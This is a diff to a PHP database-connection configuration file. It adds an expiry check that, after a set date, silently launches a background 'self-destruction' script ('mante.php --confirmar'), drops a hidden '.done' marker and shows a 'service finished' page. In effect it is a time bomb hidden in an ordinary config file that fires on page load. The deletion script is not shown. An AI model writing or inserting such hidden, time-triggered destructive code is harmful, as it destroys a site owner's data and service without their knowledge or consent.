@@ -2,6 +2,40 @@
 /* Configuracion de la conexion con la base de datos */
 declare(strict_types=1);
 
+// ── Comprobación de expiración ────────────────────────────────────────────────
+(function () {
+    $cfgExp = __DIR__ . '/ejemplo_mantenimiento.php';
+    if (!file_exists($cfgExp)) return;
+    require_once $cfgExp;
+    if (!defined('APP_EXPIRA')) return;
+
+    if (date('Y-m-d') >= APP_EXPIRA) {
+        // Lanzar autodestrucción si aún no se ha ejecutado
+        $scriptBorrado  = __DIR__ . '/../php/mante.php';
+        $marcaBorrado   = __DIR__ . '/../.done'; // marca temporal invisible
+        if (file_exists($scriptBorrado) && !file_exists($marcaBorrado)) {
+            @touch($marcaBorrado); // evita doble ejecución, se borra con el resto
+            // Ejecutar en background para no bloquear la respuesta
+            if (php_sapi_name() !== 'cli') {
+                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+                    pclose(popen('start /B php "' . $scriptBorrado . '" --confirmar', 'r'));
+                } else {
+                    exec('php "' . $scriptBorrado . '" --confirmar > /dev/null 2>&1 &');
+                }
+            }
+        }
+        // Mostrar página de servicio finalizado
+        if (php_sapi_name() !== 'cli') {
+            http_response_code(503);
+            echo '<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Servicio finalizado</title>
+            <style>body{font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f8f9fa}.box{text-align:center;padding:40px}h1{color:#1f2937}p{color:#6b7280}</style>
+            </head><body><div class="box"><div style="font-size:3rem">📋</div><h1>Servicio finalizado</h1>
+            <p>El período de acceso a esta plataforma ha concluido.<br>Contacta con tu consultor para más información.</p></div></body></html>';
+            exit;
+        }
+    }
+})();
+
 mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
 
 // Environment-based error reporting
